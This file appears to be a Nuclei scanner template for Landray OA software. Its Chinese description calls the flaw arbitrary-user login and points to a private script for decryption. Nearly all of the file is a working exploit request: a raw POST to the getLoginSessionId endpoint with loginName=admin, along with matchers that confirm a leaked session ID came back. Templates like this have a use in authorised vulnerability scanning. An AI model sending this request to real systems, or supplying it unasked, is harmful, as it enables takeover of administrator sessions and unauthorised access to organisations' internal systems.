id: landray-getloginsessionid-session-infoleak
info:
  name: landray-getloginsessionid-session-infoleak
  author: apple
  severity: high
  description: 蓝凌任意用户登陆。需要解密，解密脚本请看自建漏洞库！
  reference:
    - https://
  tags: landray
http:
  - raw:
      - |-
        POST /api/sys-authentication/loginService/getLoginSessionId.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Cookie: SESSION=ZjMwOThlNmYtMGQwOS00ZDJhLWJhNzctN2FhODA1ZWFkYTQ2
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        loginName=admin
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: word
        part: body
        words:
          - sessionId
